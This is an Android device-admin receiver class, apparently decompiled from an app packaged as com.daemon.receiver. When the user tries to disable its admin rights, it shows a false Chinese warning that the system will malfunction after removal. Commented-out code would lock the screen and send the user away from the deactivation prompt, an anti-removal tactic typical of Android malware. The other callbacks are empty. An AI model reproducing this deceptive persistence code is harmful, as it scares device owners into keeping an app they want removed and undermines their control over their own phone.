package com.daemon.receiver;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class DeviceReceiver extends DeviceAdminReceiver {
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        try {
//            c.l(context, PowerActivity.class);
//            Intent intent2 = new Intent("android.intent.action.MAIN", (Uri) null);
//            intent2.addFlags(67108864);
//            intent2.addFlags(268435456);
//            intent2.addFlags(32768);
//            intent2.addFlags(134217728);
//            intent2.addCategory("android.intent.category.HOME");
//            context.startActivity(intent2);
//            Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage("com.android.settings");
//            launchIntentForPackage.setFlags(268435456);
//            context.startActivity(launchIntentForPackage);
//            ((DevicePolicyManager) context.getSystemService("device_policy")).lockNow();
            return "解除后系统将出现异常！";
        } catch (Exception unused) {
            return "解除后系统将出现异常！";
        }
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public void onDisabled(Context context, Intent intent) {
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public void onEnabled(Context context, Intent intent) {
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public void onPasswordChanged(Context context, Intent intent) {
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public void onPasswordFailed(Context context, Intent intent) {
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public void onPasswordSucceeded(Context context, Intent intent) {
    }

    @Override // android.app.admin.DeviceAdminReceiver, android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }
}
